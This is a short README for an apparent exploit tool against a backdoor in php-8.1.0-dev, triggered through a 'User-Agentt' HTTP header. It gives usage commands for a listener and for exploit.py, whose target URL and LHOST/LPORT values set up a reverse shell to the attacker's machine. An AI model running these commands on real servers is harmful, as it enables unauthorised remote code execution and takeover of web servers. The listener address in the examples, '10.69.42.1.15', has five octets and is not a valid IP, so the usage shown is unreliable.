# php-8.1.0-dev-backdoor-rce
A script that exploits the User-Agentt HTTP header to provide remote code execution on a webserver running php-8.1.0-dev.

For more information about this vulnerability, see Flast101's post: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/


### Example usage

listener.py (if you're lacking netcat)

```shell

python3 ./listener.py -l 10.69.42.1.15 -p 1337

```


exploit.py

```shell

python3 ./exploit.py --URL http://10.129.44.132 --RPORT 80 --LHOST 10.69.42.1.15 --LPORT 1337

```
